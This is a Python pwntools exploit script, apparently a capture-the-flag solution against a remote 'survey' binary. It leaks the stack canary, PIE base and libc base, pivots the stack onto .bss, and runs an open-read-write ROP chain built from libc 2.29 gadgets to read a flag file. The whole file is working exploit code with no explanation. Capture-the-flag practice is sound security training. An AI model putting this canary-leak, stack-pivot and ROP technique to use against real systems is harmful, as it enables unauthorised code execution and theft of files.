from pwn import *

###Addr
#  libc2.29
main_offset = 0x1214
main_skip_initproc_offset = 0x1235
csu_init_offset = 0x12f0
bss_offset = 0x4c00
fflush_offset = 0x81e50
gets_offset = 0x832f0

###ROPgadget
L_pop_rdi = 0x26542
L_pop_rsi = 0x26f9e
L_pop_rdx = 0x12bda6
L_pop_rax = 0x47cf8
L_syscall = 0xcf6c5
L_leave = 0x58373

###Exploit
r = remote('140.112.31.97',30201)

###Stage1 : leak canary/pie & stack pivot onto bss
r.sendafter('name : ','a'*0x19)
leak = r.recvline()[-14:-1]
canary = b'\x00'+leak[:7]
csu_init_addr = u64(leak[7:]+b'\x00\x00')
code_base = csu_init_addr-csu_init_offset
print(hex(u64(canary)))
print(hex(code_base))

padding = b'a'*0x18
fake_rbp = p64(code_base+bss_offset)
trampoline = p64(code_base+main_skip_initproc_offset)
payload = padding+canary+fake_rbp+trampoline
r.sendafter('here : ',payload)

###Stage2 : stack pivot to prepare for leak
r.sendafter('name : ','M30W')

padding = b'a'*0x18
fake_rbp= p64(code_base+bss_offset)
trampoline = p64(code_base+main_skip_initproc_offset)
payload = padding+canary+fake_rbp+trampoline
r.sendafter('here : ',payload)

###Stage3 : leak with overlapping stack buffer/call frame, and stack pivot a few times...

r.sendafter('name : ','a'*8)
fflush_addr = u64(r.recvline()[-7:-1]+b'\x00\x00')-157
libc_base = fflush_addr-fflush_offset
print(hex(libc_base))

stub = p64(libc_base+L_pop_rdi)+p64(code_base+bss_offset-0x8)+\
       p64(libc_base+gets_offset)
fake_rbp = p64(code_base+bss_offset-0x28)
trampoline = p64(libc_base+L_leave)
payload = stub+canary+fake_rbp+trampoline
r.sendafter('here : ',payload)

###Stage4 : ORW with ROPchain

ROPchain = p64(libc_base+L_pop_rdi)+p64(code_base+bss_offset+0xf8)+\
           p64(libc_base+L_pop_rsi)+p64(0)+\
           p64(libc_base+L_pop_rdx)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(2)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(3)+\
           p64(libc_base+L_pop_rsi)+p64(code_base+bss_offset+0xf8)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(0)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(1)+\
           p64(libc_base+L_pop_rsi)+p64(code_base+bss_offset+0xf8)+\
           p64(libc_base+L_pop_rdx)+p64(0x100)+\
           p64(libc_base+L_pop_rax)+p64(1)+\
           p64(libc_base+L_syscall)+\
           p64(libc_base+L_pop_rdi)+p64(0)+\
           p64(libc_base+L_pop_rax)+p64(60)+\
           p64(libc_base+L_syscall)
argument = b'/home/survey/flag'
payload = ROPchain+argument
r.sendline(payload)

r.interactive()
